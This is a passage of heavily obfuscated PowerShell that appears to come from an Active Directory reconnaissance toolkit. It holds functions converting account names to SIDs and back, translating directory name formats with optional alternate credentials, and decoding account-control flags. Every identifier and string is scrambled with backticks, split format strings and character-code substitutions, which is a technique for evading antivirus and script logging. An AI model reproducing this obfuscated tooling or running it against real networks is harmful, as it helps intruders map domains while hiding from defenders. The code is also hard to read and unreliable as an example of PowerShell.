        ${c`Rede`Nti`Al} =  (  &("{0}{2}{1}" -f'v','Ble','Aria') ("{2}{0}{1}"-f'E','zN','PKf') )."vAl`UE"::"eMP`TY"
    )

    BEGIN {
        ${domAiNsEA`R`ChErAr`G`UmEntS} = @{}
        if (${ps`B`Ou`NdpA`RAM`eTeRS}[("{1}{0}"-f 'in','Doma')]) { ${Do`Ma`iN`sEArChE`R`ArGuMEnTS}[("{1}{0}{2}"-f'om','D','ain')] = ${do`ma`iN} }
        if (${P`sbouNd`pA`Ra`MeTErs}[("{0}{1}"-f 'Se','rver')]) { ${doMAIn`SeaR`ChERAR`G`U`MEntS}[("{0}{1}"-f'Serve','r')] = ${S`ErVeR} }
        if (${pSBo`UN`Dp`AR`A`MEtErS}[("{1}{3}{2}{0}" -f'l','C','ntia','rede')]) { ${doma`i`NS`E`Arc`HE`Rargume`NTS}[("{0}{1}{2}"-f'Credent','i','al')] = ${C`ReDEnTi`Al} }
    }

    PROCESS {
        ForEach (${o`BJe`CT} in ${objE`cTn`Ame}) {
            ${O`B`jecT} = ${o`B`JEcT} -Replace '/','\'

            if (${p`sboUnD`paraMETe`Rs}[("{1}{2}{3}{0}" -f'ntial','C','red','e')]) {
                ${Dn} = &("{0}{2}{1}"-f'C','nvert-ADName','o') -Identity ${oBj`Ect} -OutputType 'DN' @DomainSearcherArguments
                if (${DN}) {
                    ${US`e`RdoMAin} = ${d`N}.("{0}{2}{1}"-f 'SubSt','ing','r').Invoke(${dN}.("{2}{1}{0}" -f 'dexOf','n','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    ${U`S`erN`AMe} = ${dN}.("{1}{0}" -f 't','Spli').Invoke(',')[0].("{1}{0}" -f 't','spli').Invoke('=')[1]

                    ${dOm`Ain`seaRcheRarG`U`MEN`TS}[("{0}{2}{1}" -f 'Id','y','entit')] = ${U`SErn`AMe}
                    ${dom`AI`NsE`Ar`cHe`RArguMEntS}[("{0}{1}"-f 'Do','main')] = ${u`SerD`om`AIn}
                    ${d`omaiNSEA`RCH`ErAR`G`Um`eN`TS}[("{2}{3}{1}{0}" -f 's','e','Prop','erti')] = ("{2}{1}{0}" -f'd','si','object')
                    &("{4}{3}{1}{0}{2}" -f'o','D','mainObject','-','Get') @DomainSearcherArguments | &("{3}{2}{1}{0}" -f'bject','ct-O','e','Sel') -Expand ("{0}{2}{1}" -f 'o','jectsid','b')
                }
            }
            else {
                try {
                    if (${obJ`e`Ct}.("{0}{1}"-f'Contain','s').Invoke('\')) {
                        ${doMa`in} = ${O`Bject}.("{1}{0}" -f'plit','S').Invoke('\')[0]
                        ${OB`JE`CT} = ${oBj`ect}.("{0}{1}"-f 'S','plit').Invoke('\')[1]
                    }
                    elseif (-not ${P`sBO`Undp`ARAMeTERs}[("{1}{0}"-f 'in','Doma')]) {
                        ${D`omAi`NsE`Ar`CHe`R`ArgUMeNTS} = @{}
                        ${do`MAIN} = (&("{0}{2}{1}"-f'Ge','in','t-Doma') @DomainSearcherArguments)."nA`mE"
                    }

                    ${o`BJ} = (&("{1}{2}{0}" -f'ct','Ne','w-Obje') ("{5}{7}{1}{2}{3}{4}{8}{6}{0}" -f 't','ec','urity.Princi','pal','.','Sys','ccoun','tem.S','NTA')(${DO`MA`In}, ${oBJ`ect}))
                    ${O`Bj}."t`RaNs`LAte"([System.Security.Principal.SecurityIdentifier])."vaL`Ue"
                }
                catch {
                    &("{2}{1}{0}{3}{4}"-f'e','te-V','Wri','r','bose') ('[C'+'onve'+'r'+'t'+'To-SID] '+'E'+'rror'+' '+'co'+'nvertin'+'g'+' '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}

function CONV`e`RTFRoM-`sID {

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MANdatorY = ${tr`UE}, vALUEFroMPIpELiNE = ${tr`Ue}, VALUeFRomPipeLINEbYpRoperTynAme = ${tR`UE})]
        [Alias('SID')]
        [ValidatePattern({"{1}{0}" -f '*','^S-1-.'})]
        [String[]]
        ${oBJeCt`S`Id},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}"-f 'Do','ontrolle','mainC','r'})]
        [String]
        ${S`ER`VEr},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DE`NtIAl} =   ( &('ls')  ("{0}{1}{2}" -f 'vAriA','bLE:Pk','fEZN'))."v`AluE"::"e`mpTY"
    )

    BEGIN {
        ${ADn`Am`EARG`UMe`Nts} = @{}
        if (${p`SBOU`NdPA`RAMET`Ers}[("{2}{1}{0}"-f'n','mai','Do')]) { ${a`dnA`MEarGU`men`TS}[("{1}{0}" -f 'ain','Dom')] = ${DOma`iN} }
        if (${pSBou`N`DPArame`TE`Rs}[("{1}{0}{2}" -f 'v','Ser','er')]) { ${aDNamEaR`Gum`enTS}[("{0}{1}" -f'Serv','er')] = ${sE`R`VEr} }
        if (${PSb`oUn`DpA`RAmET`Ers}[("{0}{2}{1}"-f 'Cr','al','edenti')]) { ${ad`NAMe`ARGUmEnTs}[("{0}{3}{2}{1}" -f 'Cre','l','tia','den')] = ${CrEd`E`NTiAL} }
    }

    PROCESS {
        ForEach (${TArGE`T`SId} in ${Ob`je`ctSiD}) {
            ${t`AR`getsID} = ${TAR`ge`TsId}.("{0}{1}"-f 'tri','m').Invoke('*')
            try {

                Switch (${TaRg`eTS`id}) {
                    ("{0}{1}" -f'S-1','-0')         { ("{0}{1}{3}{2}" -f 'Nu','ll Autho','ty','ri') }
                    ("{2}{1}{0}"-f'-0-0','1','S-')       { ("{1}{2}{0}" -f'body','N','o') }
                    ("{0}{1}"-f 'S-1','-1')         { ("{2}{3}{1}{4}{0}" -f'ity','Autho','Wor','ld ','r') }
                    ("{1}{0}" -f '-1-1-0','S')       { ("{1}{2}{0}" -f 'e','E','veryon') }
                    ("{1}{0}"-f'-1-2','S')         { ("{0}{2}{3}{1}" -f 'L','thority','oca','l Au') }
                    ("{1}{2}{0}"-f '0','S','-1-2-')       { ("{0}{1}" -f'L','ocal') }
                    ("{1}{0}" -f'-1','S-1-2')       { ("{2}{3}{1}{0}" -f 'Logon ',' ','Cons','ole') }
                    ("{0}{1}"-f 'S-','1-3')         { ("{3}{2}{0}{1}{4}"-f 'e','ator Auth','r','C','ority') }
                    ("{1}{0}"-f'1-3-0','S-')       { ("{2}{0}{3}{1}"-f'wn','r','Creator O','e') }
                    ("{0}{2}{1}"-f'S','-3-1','-1')       { ("{3}{2}{0}{1}"-f' G','roup','eator','Cr') }
                    ("{1}{0}{2}"-f'-','S-1','3-2')       { ("{2}{1}{4}{3}{0}" -f 'er Server','reator','C','Own',' ') }
                    ("{0}{1}"-f'S-1','-3-3')       { ("{0}{2}{3}{1}" -f 'Cre','er','ator Gro','up Serv') }
                    ("{0}{1}{2}"-f 'S-1-3','-','4')       { ("{2}{3}{0}{1}"-f' Right','s','Ow','ner') }
                    ("{0}{1}" -f 'S','-1-4')         { ("{2}{0}{1}{4}{3}" -f 'e Auth','or','Non-uniqu','y','it') }
                    ("{0}{1}" -f 'S-1','-5')         { ("{3}{1}{2}{0}"-f'ority','T',' Auth','N') }
                    ("{1}{0}{2}"-f'1-','S-','5-1')       { ("{0}{1}"-f 'Di','alup') }
                    ("{2}{1}{0}" -f'5-2','-','S-1')       { ("{0}{2}{1}" -f'N','ork','etw') }
                    ("{1}{0}" -f '-5-3','S-1')       { ("{1}{0}"-f 'atch','B') }
                    ("{1}{0}" -f '5-4','S-1-')       { ("{3}{2}{1}{0}"-f 've','acti','er','Int') }
                    ("{1}{0}{2}"-f'-1-5','S','-6')       { ("{1}{0}"-f 'vice','Ser') }
                    ("{1}{0}{2}"-f '-5','S-1','-7')       { ("{3}{0}{2}{1}"-f 'no','us','nymo','A') }
                    ("{1}{0}"-f '1-5-8','S-')       { ("{0}{1}"-f 'Pro','xy') }
                    ("{1}{0}"-f '-5-9','S-1')       { ("{2}{3}{5}{0}{1}{4}" -f'omain Cont','r','E','nterprise','ollers',' D') }
                    ("{1}{2}{0}" -f '1-5-10','S','-')      { ("{1}{2}{3}{0}" -f'lf','Prin','ci','pal Se') }
                    ("{2}{1}{0}"-f'1-5-11','-','S')      { ("{5}{0}{3}{4}{2}{1}"-f 'uthe','sers','U','ntica','ted ','A') }
                    ("{0}{2}{1}"-f'S-1','5-12','-')      { ("{2}{3}{1}{0}{4}" -f 'Co','d ','Restri','cte','de') }
                    ("{1}{0}{2}" -f '1-5-1','S-','3')      { ("{5}{0}{1}{2}{4}{6}{3}"-f 'nal Se','rve','r U','rs','s','Termi','e') }
                    ("{2}{0}{1}" -f'1','4','S-1-5-')      { ("{1}{6}{2}{4}{3}{7}{0}{5}"-f'ractive ','R','e I','t','n','Logon','emot','e') }
                    ("{0}{1}{2}"-f'S-','1-5','-15')      { ("{3}{0}{2}{1}" -f'Organiz','ion ','at','This ') }
                    ("{0}{1}{2}" -f 'S','-1-5-','17')      { ("{4}{2}{5}{0}{3}{1}" -f 'aniz','tion ','s O','a','Thi','rg') }
                    ("{2}{1}{0}" -f '18','-5-','S-1')      { ("{2}{1}{0}{3}" -f 'te','Sys','Local ','m') }
                    ("{1}{0}{2}" -f '-1-5-1','S','9')      { ("{2}{0}{1}" -f 'hori','ty','NT Aut') }
                    ("{0}{1}{2}"-f'S-1','-5-','20')      { ("{1}{3}{2}{0}" -f 'ity','NT ','or','Auth') }
                    ("{0}{2}{1}"-f 'S-1-5-','-0','80')    { ("{1}{2}{0}" -f 'vices ','All ','Ser') }
                    ("{0}{1}{2}"-f'S-1-5','-3','2-544')  { ((("{1}{4}{2}{0}{5}{3}"-f 'INm4VAdmi','BUI','T','tors','L','nistra')).("{1}{0}" -f'epLacE','R').Invoke('m4V','\')) }
                    ("{0}{2}{1}{3}" -f 'S-1-5','-54','-32','5')  { ((("{2}{0}{1}" -f 'LTI','N{0}Users','BUI'))  -F[cHar]92) }
                    ("{1}{0}{2}" -f '-5-','S-1','32-546')  { ((("{5}{3}{1}{4}{2}{0}"-f'sts','TI','ue','IL','N4y8G','BU'))."rePLa`cE"(([CHAr]52+[CHAr]121+[CHAr]56),[sTRIng][CHAr]92)) }
                    ("{1}{3}{0}{2}" -f '2-54','S-1','7','-5-3')  { ((("{4}{2}{1}{0}{3}" -f 'TINlw3Power ','L','UI','Users','B'))."rE`Pla`Ce"(([ChAR]108+[ChAR]119+[ChAR]51),[StRiNG][ChAR]92)) }
                    ("{2}{0}{1}"-f'-','32-548','S-1-5')  { ((("{0}{4}{1}{2}{6}{5}{3}" -f 'BU','TINU','A','tors','IL','era','VAccount Op'))  -rEpLAcE ([CHAR]85+[CHAR]65+[CHAR]86),[CHAR]92) }
                    ("{0}{2}{1}{3}" -f'S-1-','32-5','5-','49')  { ((("{4}{1}{2}{3}{5}{6}{0}" -f's','ILTINt','p0S','erver ','BU','Op','erator')) -crEPlAce ([CHaR]116+[CHaR]112+[CHaR]48),[CHaR]92) }
                    ("{2}{1}{0}{3}" -f '5-','-','S-1','32-550')  { ((("{2}{5}{6}{4}{1}{3}{0}"-f 'tors','r','BUI','a',' Ope','LTIN{0}Prin','t')) -f[ChaR]92) }
                    ("{1}{2}{3}{0}"-f'-551','S-1','-5-3','2')  { ((("{1}{3}{0}{7}{8}{5}{6}{4}{2}"-f'WiB','BU','rs','ILTINK','o','e','rat','a','ckup Op')).("{0}{1}"-f 'ReP','laCe').Invoke('KWi','\')) }
                    ("{3}{1}{0}{2}"-f'-32-55','-5','2','S-1')  { ((("{0}{3}{2}{1}{4}" -f 'B','cato','NuqRRepli','UILTI','rs'))-RePlACE ([cHar]117+[cHar]113+[cHar]82),[cHar]92) }
                    ("{1}{0}{2}" -f'2-5','S-1-5-3','54')  { ((("{2}{1}{9}{11}{8}{3}{0}{6}{5}{12}{4}{7}{10}"-f 'Co','U','B','dows 2000 ','ible A','a','mp','cc','Win','ILTI','ess','NOoqPre-','t'))  -replACE 'Ooq',[chAr]92) }
                    ("{0}{3}{1}{2}" -f'S-','-5','55','1-5-32')  { ((("{0}{1}{4}{3}{5}{2}"-f 'BUILTIN{0}Remote',' ','rs','skto','De','p Use'))-F  [CHAr]92) }
                    ("{1}{2}{0}{3}" -f '3','S','-1-5-','2-556')  { ((("{1}{4}{7}{5}{3}{6}{0}{2}"-f't','BUILT','ors','figu','IN{','on','ration Opera','0}Network C'))  -f [CHAR]92) }
                    ("{2}{0}{1}" -f'-5-32-5','57','S-1')  { ((("{6}{4}{3}{1}{0}{5}{2}" -f 'o','F','st Trust Builders','ng ','TINoveIncomi','re','BUIL'))-ReplAcE  ([cHar]111+[cHar]118+[cHar]101),[cHar]92) }
                    ("{1}{0}{3}{2}"-f'1-','S-','-558','5-32')  { ((("{6}{0}{1}{5}{4}{7}{9}{3}{8}{2}"-f'IL','T','rs','ma','NHZpP','I','BU','e','nce Monitor Use','rfor')).("{0}{1}" -f 'RepL','ACe').Invoke('HZp','\')) }
                    ("{1}{2}{0}"-f'9','S','-1-5-32-55')  { ((("{5}{3}{1}{2}{6}{4}{0}" -f 's','INmidPerf','ormance Log','LT','User','BUI',' ')).("{0}{1}{2}" -f'REpLa','C','E').Invoke('mid','\')) }
                    ("{1}{0}{2}" -f '2-','S-1-5-3','560')  { ((("{1}{8}{10}{6}{0}{2}{5}{7}{3}{4}{9}" -f '5Win','BUI','dows Authorizat',' A','cces','io','INh9','n','L','s Group','T'))  -crEplacE'h95',[ChaR]92) }
                    ("{0}{1}{2}"-f'S-1-5-32','-5','61')  { ((("{9}{10}{6}{7}{0}{8}{2}{4}{11}{5}{1}{3}" -f' ','r','e','vers','rv',' License Se','LTIN1DKTermina','l','S','BU','I','er')).("{0}{1}{2}" -f 'rE','pLaC','e').Invoke('1DK','\')) }
                    ("{1}{3}{0}{2}" -f'56','S-1-5','2','-32-')  { ((("{1}{6}{4}{2}{5}{3}{0}" -f 'sers','B','bu',' COM U','NXZzDistri','ted','UILTI'))."R`EplaCE"(([ChaR]88+[ChaR]90+[ChaR]122),'\')) }
                    ("{3}{2}{0}{1}"-f '-32-56','9','1-5','S-')  { ((("{3}{5}{7}{0}{8}{1}{4}{6}{2}"-f'NZ','ryptogr','ors','BUI','ap','L','hic Operat','TI','a9C'))-rePlace  'Za9',[CHAR]92) }
                    ("{3}{0}{2}{1}" -f'-5-','-573','32','S-1')  { ((("{4}{7}{2}{5}{1}{6}{0}{3}"-f'ade',' ','LTINE7YEvent Lo','rs','B','g','Re','UI')) -rEpLacE 'E7Y',[cHaR]92) }
                    ("{2}{0}{1}"-f '2-57','4','S-1-5-3')  { ((("{8}{5}{4}{1}{2}{6}{9}{3}{7}{0}" -f'ss','ertifi','c','ce D','TINhuPC','IL','at','COM Acce','BU','e Servi'))-Replace([chAr]104+[chAr]117+[chAr]80),[chAr]92) }
                    ("{2}{1}{0}" -f '5','2-57','S-1-5-3')  { ((("{2}{5}{0}{1}{3}{6}{4}" -f 'IN5NG','RDS Remote A','B','cce','vers','UILT','ss Ser'))."Repl`ACe"('5NG',[STRinG][ChAr]92)) }
                    ("{1}{3}{0}{2}"-f'2-','S','576','-1-5-3')  { ((("{1}{4}{6}{5}{0}{2}{3}"-f'nt','BUILTINIriRDS ',' Se','rvers','En','i','dpo'))  -rePLAce([cHaR]73+[cHaR]114+[cHaR]105),[cHaR]92) }
                    ("{1}{3}{2}{0}" -f'7','S-','57','1-5-32-')  { ((("{10}{9}{7}{3}{8}{2}{0}{5}{1}{4}{6}"-f'a','geme','kRDS M','N','nt Serv','na','ers','I','wR','UILT','B'))."R`ePLACe"(([chaR]119+[chaR]82+[chaR]107),'\')) }
                    ("{2}{1}{0}" -f'8','-5-32-57','S-1')  { ((("{6}{7}{5}{0}{3}{1}{4}{2}"-f'IN{0}Hyper-','mini','ators','V Ad','str','T','B','UIL')) -f  [char]92) }
                    ("{1}{0}{3}{2}" -f '1-5-32-5','S-','9','7')  { ((("{2}{6}{4}{5}{1}{7}{3}{0}{8}"-f'tor',' As','B','a','tLAccess',' Control','UILTINN','sistance Oper','s')) -crEPlAcE ([CHar]78+[CHar]116+[CHar]76),[CHar]92) }
                    ("{1}{3}{2}{0}" -f '5-32-580','S-','-','1')  { ((("{4}{6}{5}{8}{1}{0}{2}{7}{3}"-f'st',' Assi','ance O','erators','BUILTI','ntr','N{0}Access Co','p','ol'))  -f [cHaR]92) }
                    ("{0}{1}" -f'Defau','lt') {
                        &("{1}{2}{0}" -f'me','Conver','t-ADNa') -Identity ${TARG`E`T`sid} @ADNameArguments
                    }
                }
            }
            catch {
                &("{1}{0}{2}" -f'bos','Write-Ver','e') ('[ConvertF'+'r'+'om-S'+'ID'+'] '+'Er'+'ror '+'co'+'nver'+'ting '+'S'+'ID '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}

function C`oNveRt`-AdN`A`ME {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{8}{6}{2}{4}{5}{10}{12}{7}{11}{9}{3}{1}"-f'PSUseSh','ns','ocessF','o','o','r','Pr','gFu','ould','i','StateChangi','nct','n'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MaNdAToRY = ${Tr`Ue}, VALueFroMPiPELinE = ${T`RUE}, vALUEfroMPIpELiNebYPRoPeRTynAmE = ${tr`Ue})]
        [Alias({"{1}{0}"-f'me','Na'}, {"{0}{1}{2}"-f'Obj','ec','tName'})]
        [String[]]
        ${i`D`EnTITy},

        [String]
        [ValidateSet('DN', {"{2}{0}{1}"-f 'on','ical','Can'}, 'NT4', {"{0}{2}{1}"-f 'Di','lay','sp'}, {"{0}{2}{1}{3}" -f 'Doma','nSimp','i','le'}, {"{0}{2}{1}{3}" -f 'Enterp','eSimpl','ris','e'}, {"{0}{1}" -f 'GUI','D'}, {"{0}{1}" -f 'Unkn','own'}, 'UPN', {"{1}{3}{0}{2}" -f 'onical','C','Ex','an'}, 'SPN')]
        ${OutPu`TtY`pe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{4}{1}{3}"-f 'ma','ontr','Do','oller','inC'})]
        [String]
        ${se`R`Ver},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RE`DEnt`ial} =  (  &("{1}{0}"-f'IR','d')  ("{2}{1}{3}{0}{4}" -f'pkF','Riable','va',':','eZN'))."VA`Lue"::"emp`TY"
    )

    BEGIN {
        ${nA`MetYp`eS} = @{
            'DN'                =   1  
            ("{0}{2}{1}"-f'Canon','l','ica')         =   2  
            'NT4'               =   3  
            ("{1}{0}{2}"-f 's','Di','play')           =   4  
            ("{1}{0}{3}{2}" -f 'omainSi','D','ple','m')      =   5  
            ("{1}{0}{2}{3}" -f 'pris','Enter','eS','imple')  =   6  
            ("{1}{0}"-f 'UID','G')              =   7  
            ("{0}{1}"-f 'Unkn','own')           =   8  
            'UPN'               =   9  
            ("{2}{3}{1}{0}"-f'lEx','a','Cano','nic')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        function Inv`OkE-ME`TH`Od([__ComObject] ${O`BjeCT}, [String] ${MET`hOd}, ${PaR`AmE`TeRs}) {
            ${oU`Tp`UT} = ${nU`ll}
            ${o`Ut`pUt} = ${O`B`JeCt}.("{1}{0}" -f 'e','GetTyp').Invoke().("{0}{2}{3}{1}" -f 'I','ember','nvok','eM').Invoke(${meth`Od}, ("{2}{1}{0}" -f 'thod','eMe','Invok'), ${Nu`ll}, ${o`Bj`ecT}, ${ParA`mE`TeRs})
            &("{2}{0}{3}{1}"-f'Ou','ut','Write-','tp') ${OUT`P`Ut}
        }

        function gEt-p`R`opERty([__ComObject] ${oB`JeCt}, [String] ${Prop`Er`Ty}) {
            ${OB`J`ecT}.("{2}{0}{1}" -f 'Typ','e','Get').Invoke().("{0}{2}{1}"-f 'InvokeMe','ber','m').Invoke(${P`RoPe`RTy}, ("{1}{0}{2}" -f'r','GetP','operty'), ${n`ULL}, ${Ob`JecT}, ${n`Ull})
        }

        function seT`-PR`opE`Rty([__ComObject] ${OB`jE`CT}, [String] ${pR`opEr`Ty}, ${paRaME`T`erS}) {
            [Void] ${O`B`JEcT}.("{0}{1}{2}" -f 'Get','Ty','pe').Invoke().("{2}{1}{3}{0}"-f 'Member','nvo','I','ke').Invoke(${prOp`ertY}, ("{2}{1}{0}"-f'roperty','P','Set'), ${NU`ll}, ${OB`Je`cT}, ${P`ARAMEt`ErS})
        }

        if (${Psb`OunDpaR`A`Mete`Rs}[("{0}{1}" -f'Se','rver')]) {
            ${AD`SiNit`T`ype} = 2
            ${INITn`AME} = ${sE`Rv`ER}
        }
        elseif (${pSBoUnDpa`Ramet`e`RS}[("{0}{1}{2}"-f'Do','mai','n')]) {
            ${aDSiN`Itt`Ype} = 1
            ${I`NItna`mE} = ${Do`ma`in}
        }
        elseif (${PsbOun`dPar`AmEt`e`Rs}[("{0}{3}{1}{2}" -f 'Cred','tia','l','en')]) {
            ${cR`ED} = ${cr`ede`NT`Ial}.("{0}{4}{2}{1}{3}" -f'GetNetwor','eden','r','tial','kC').Invoke()
            ${AdS`i`NItT`YPE} = 1
            ${In`Itna`ME} = ${c`REd}."Doma`in"
        }
        else {
            ${ad`S`i`NITTyPe} = 3
            ${in`iTNa`Me} = ${n`Ull}
        }
    }

    PROCESS {
        ForEach (${t`ARGEti`dEnt`ITY} in ${i`Dent`Ity}) {
            if (-not ${psb`ou`ND`PARA`MetErS}[("{3}{1}{2}{0}"-f'pe','utputT','y','O')]) {
                if (${T`A`R`gETI`DEntItY} -match ((("{0}{4}{5}{2}{1}{7}{3}{6}"-f'^','5','-z]+','c5jc[A-','[A-','Za','Za-z ]+','j'))-crePLaCE([Char]53+[Char]106+[Char]99),[Char]92)) {
                    ${A`DsOutp`UTtY`Pe} = ${nAMET`Y`PEs}[("{3}{2}{1}{0}"-f 'le','p','im','DomainS')]
                }
                else {
                    ${AdsO`UtPUtT`yPE} = ${NAM`EtYp`ES}['NT4']
                }
            }
            else {
                ${aDSouTp`UT`TYpE} = ${nAM`et`ypEs}[${OUT`Pu`TT`yPe}]
            }

            ${Tra`Ns`lATe} = &("{1}{0}{2}" -f'ew-O','N','bject') -ComObject ("{2}{0}{1}"-f 'at','e','NameTransl')

            if (${P`SBOUNdPA`RAm`eTe`Rs}[("{3}{2}{0}{1}" -f 'ia','l','edent','Cr')]) {
                try {
                    ${cR`Ed} = ${CR`Ede`NtiAL}.("{3}{4}{0}{2}{1}" -f'd','ial','ent','GetNe','tworkCre').Invoke()

                    &("{2}{1}{0}{3}" -f 'oke-M','v','In','ethod') ${t`RaN`sla`Te} ("{2}{0}{1}"-f'nitE','x','I') (
                        ${a`dSiNi`Tt`ype},
                        ${I`NItName},
                        ${CR`Ed}."usERn`A`mE",
                        ${c`Red}."dOm`A`In",
                        ${c`Red}."pA`Ssw`oRD"
                    )
                }
                catch {
                    &("{0}{1}{2}" -f'W','rite-Ve','rbose') ('[Con'+'ve'+'rt-ADNa'+'me] '+'Err'+'o'+'r '+'initi'+'ali'+'z'+'i'+'ng '+'transla'+'tio'+'n '+'fo'+'r '+"'$Identity' "+'usin'+'g'+' '+'a'+'lt'+'ernate '+'cr'+'edent'+'i'+'als '+': '+"$_")
                }
            }
            else {
                try {
                    ${NU`Ll} = &("{1}{0}{2}{3}" -f 'v','In','oke-Metho','d') ${tRaN`sl`AtE} ("{0}{1}"-f'Ini','t') (
                        ${AdsiN`iTt`yPE},
                        ${iNi`T`NamE}
                    )
                }
                catch {
                    &("{3}{2}{0}{1}"-f 'e-','Verbose','t','Wri') ('[Conv'+'ert'+'-ADNam'+'e] '+'Erro'+'r'+' '+'ini'+'tia'+'l'+'iz'+'ing '+'t'+'ransla'+'tio'+'n '+'fo'+'r '+"'$Identity' "+': '+"$_")
                }
            }

            &("{1}{2}{0}"-f'roperty','Se','t-P') ${TRaN`sl`Ate} ("{0}{4}{3}{1}{2}" -f 'C','ferra','l','eRe','has') (0x60)

            try {
                ${n`Ull} = &("{3}{2}{1}{0}" -f '-Method','e','ok','Inv') ${T`RaN`SLAtE} 'Set' (8, ${T`A`RG`EtIdeNTity})
                &("{3}{1}{0}{2}"-f'Metho','-','d','Invoke') ${T`RAN`sLAtE} 'Get' (${AdSO`UtPUTt`y`PE})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{1}{3}{4}{2}{0}" -f'bose','Writ','Ver','e','-') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}

function c`O`NVErTFRom-UA`CvAlUE {

    [OutputType({"{3}{5}{8}{0}{4}{11}{7}{6}{2}{9}{1}{10}" -f'Speci','ti','r','System','ali','.Colle','.O','ed','ctions.','deredDic','onary','z'})]
    [CmdletBinding()]
    Param(
        [Parameter(MandaToRY = ${TR`UE}, valUefROmpIpelINE = ${tr`Ue}, vALueFrOmpiPELINEbYPRopErTYnaME = ${T`RUE})]
        [Alias('UAC', {"{3}{2}{1}{5}{0}{4}"-f 'c','e','s','u','countcontrol','ra'})]
        [Int]
        ${va`l`UE},

        [Switch]
        ${SHOW`A`LL}
    )

    BEGIN {

        ${UAc`Va`LueS} = &("{1}{0}{2}" -f 'ew','N','-Object') ("{2}{4}{9}{6}{8}{3}{5}{1}{7}{0}" -f 'y','ona','Syst','eci','em.Co','alized.OrderedDicti','lections.','r','Sp','l')
        ${UAc`VA`l`UEs}.("{1}{0}" -f'dd','A').Invoke(("{0}{2}{1}"-f'SCR','PT','I'), 1)
        ${uacvA`LU`Es}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{1}" -f 'ACC','E','OUNTDISABL'), 2)
        ${Uac`V`AluEs}.("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{4}{3}{1}"-f 'HOMEDIR','D','_','EQUIRE','R'), 8)
        ${U`Ac`V`AlUeS}.("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}"-f'LO','KOUT','C'), 16)
        ${u`ACVa`luES}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{3}{2}" -f 'SSWD_N','PA','D','OTREQ'), 32)
        ${Uac`VAL`U`eS}.("{1}{0}"-f 'dd','A').Invoke(("{3}{4}{2}{0}{1}" -f'_CANT_CHAN','GE','SWD','P','AS'), 64)
        ${U`AcvA`LUes}.("{0}{1}"-f 'A','dd').Invoke(("{0}{5}{3}{1}{2}{4}"-f'ENCR','WD_A','L','_P','LOWED','YPTED_TEXT'), 128)
        ${U`AcVa`LUes}.("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{2}{0}"-f 'CCOUNT','T','E_A','TEMP_DUPLICA'), 256)
        ${uaC`Va`lU`es}.("{1}{0}" -f'd','Ad').Invoke(("{3}{0}{2}{1}"-f'MAL_A','OUNT','CC','NOR'), 512)
        ${UAc`VAlU`Es}.("{1}{0}"-f 'dd','A').Invoke(("{5}{7}{2}{6}{4}{3}{0}{1}" -f'U','NT','R','ACCO','ST_','INTERDOMAIN_','U','T'), 2048)
        ${uA`C`ValuEs}.("{0}{1}"-f 'A','dd').Invoke(("{1}{6}{4}{3}{2}{5}{0}" -f'COUNT','WOR','S','RU','ATION_T','T_AC','KST'), 4096)
        ${u`Ac`VA`lUEs}.("{0}{1}"-f'A','dd').Invoke(("{3}{1}{2}{4}{5}{0}" -f 'T','ERV','ER_TR','S','US','T_ACCOUN'), 8192)
        ${uACV`Alu`es}.("{1}{0}"-f 'dd','A').Invoke(("{2}{6}{1}{5}{3}{0}{4}"-f 'SSW','XP','DO','A','ORD','IRE_P','NT_E'), 65536)
        ${uaC`VaL`UEs}.("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{3}{2}" -f 'MNS_','LOGON_AC','UNT','CO'), 131072)
        ${U`AC`VALueS}.("{1}{0}" -f'd','Ad').Invoke(("{2}{5}{4}{0}{1}{3}"-f'EQUIR','E','SMAR','D','R','TCARD_'), 262144)
        ${uAc`V`AL`UES}.("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{5}{1}{4}{0}" -f'ELEGATION','FOR_','S','TRU','D','TED_'), 524288)
        ${UaC`VA`LuES}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}"-f 'GATED','NOT_','DELE'), 1048576)
        ${U`AcVaLU`es}.("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}{4}{3}"-f'E','DES_K','USE_','_ONLY','Y'), 2097152)
        ${Ua`c`VAlUes}.("{1}{0}"-f'dd','A').Invoke(("{0}{2}{3}{1}" -f'D','EAUTH','ONT','_REQ_PR'), 4194304)
        ${UA`Cv`A`lUeS}.("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}{3}"-f'D_','EX','PASSWOR','PIRED'), 8388608)
        ${uAcVA`L`UeS}.("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}{6}{3}{7}{5}{4}{8}" -f'D_T','TR','USTE','_FOR_D','TIO','GA','O_AUTH','ELE','N'), 16777216)
        ${U`Acv`AlU`ES}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{0}{1}{6}{5}{3}{2}"-f'A','RTIAL_SECR','COUNT','AC','P','TS_','E'), 67108864)
    }

    PROCESS {
        ${RE`s`UltuacVA`L`UES} = &("{2}{0}{1}"-f'-Obj','ect','New') ("{4}{6}{7}{9}{5}{1}{2}{3}{8}{0}" -f'y','i','ze','d.Orde','Syst','pecial','em.C','oll','redDictionar','ections.S')

        if (${sh`o`wAlL}) {
            ForEach (${UACv`AL`UE} in ${UA`cVa`LU`eS}.("{2}{0}{1}"-f 't','or','GetEnumera').Invoke()) {
